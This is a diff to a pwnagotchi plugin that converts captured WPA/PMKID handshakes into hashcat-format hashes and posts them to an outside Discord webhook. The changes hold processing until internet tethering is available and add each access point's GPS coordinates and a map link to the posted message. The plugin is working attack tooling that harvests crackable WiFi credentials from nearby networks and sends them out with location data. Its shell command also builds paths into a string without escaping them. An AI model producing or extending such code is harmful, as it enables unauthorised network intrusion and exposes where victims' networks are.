@@ -22,6 +22,8 @@ class discohash(plugins.Plugin):
 
     # called when the plugin is loaded
     def on_loaded(self):
+        global tether
+        tether = False
         logging.info(f"[*] DiscoHash plugin loaded")
     
 
@@ -30,7 +32,15 @@ class discohash(plugins.Plugin):
         global fingerprint
         fingerprint = agent.fingerprint()
         handshake_dir = "/root/handshakes/"
-        self.process_pcaps(handshake_dir)
+        if tether:
+            self.process_pcaps(handshake_dir)
+        else:
+            return
+
+
+    def on_internet_available(self, agent):
+        global tether
+        tether = True
 
 
     def process_pcaps(self, handshake_dir):
@@ -57,16 +67,32 @@ class discohash(plugins.Plugin):
             logging.debug('[*] DiscoHash Batch job: {} networks without enough packets to create a hash'.format(len(lonely_pcaps)))
     
 
-    def write_hash(self, fullpath):
-        fullpathNoExt = fullpath.split('.')[0]
-        filename = fullpath.split('/')[-1:][0].split('.')[0]
-        result = subprocess.getoutput('hcxpcapngtool -o {}.22000 {} >/dev/null 2>&1'.format(fullpathNoExt,fullpath))
+    def write_hash(self, handshake):
+        fullpathNoExt = handshake.split('.')[0]
+        filename = handshake.split('/')[-1:][0].split('.')[0]
+        result = subprocess.getoutput('hcxpcapngtool -o {}.22000 {} >/dev/null 2>&1'.format(fullpathNoExt,handshake))
         if os.path.isfile(fullpathNoExt +  '.22000'):
             logging.info('[+] DiscoHash EAPOL/PMKID Success: {}.22000 created'.format(filename))
+            self.get_coord(fullpathNoExt)
             self.post_hash(fullpathNoExt)
             return True
         else:
             return False
+    
+
+    def get_coord(self, fullpathNoExt):
+        global lat
+        global lon
+        global loc_url
+        try:
+            read_gps = open(f'{fullpathNoExt}.gps.json', 'r')
+            gps_bytes = read_gps.read()
+            raw_gps = json.loads(gps_bytes)
+            lat = json.dumps(raw_gps['Latitude'])
+            lon = json.dumps(raw_gps['Longitude'])
+            loc_url = "https://www.google.com/maps/search/?api=1&query={},{}".format(lat, lon)
+        except Exception as e:
+            loc_url = "No GPS data available for this AP!"
 
 
     def post_hash(self, fullpathNoExt):
@@ -80,10 +106,10 @@ class discohash(plugins.Plugin):
             data = {
                 'embeds': [
                     {
-                    'title': '(⌐■_■) {} sniffed a new hash!'.format(pwnagotchi.name()), 
-                    'color': 3553599,
-                    'description': '__**Hash Information**__',
+                    'title': '(ᵔ◡◡ᵔ) {} sniffed a new hash!'.format(pwnagotchi.name()), 
+                    'color': 289968,
                     'url': 'https://pwnagotchi.ai/pwnfile/#!{}'.format(fingerprint),
+                    'description': '__**Hash Information**__',
                     'fields': [
                         {
                             'name': 'Hash:',
@@ -93,6 +119,11 @@ class discohash(plugins.Plugin):
                         {
                             'name': 'Hash Analysis:',
                             'value': '```{}```'.format(analysis),
+                            'inline': False
+                        },
+                        {
+                            'name': 'GPS Location:',
+                            'value': '[Map Waypoint]({})\n```{},{}```'.format(loc_url,lat,lon),
                             'inline': False
                         },
                     ],
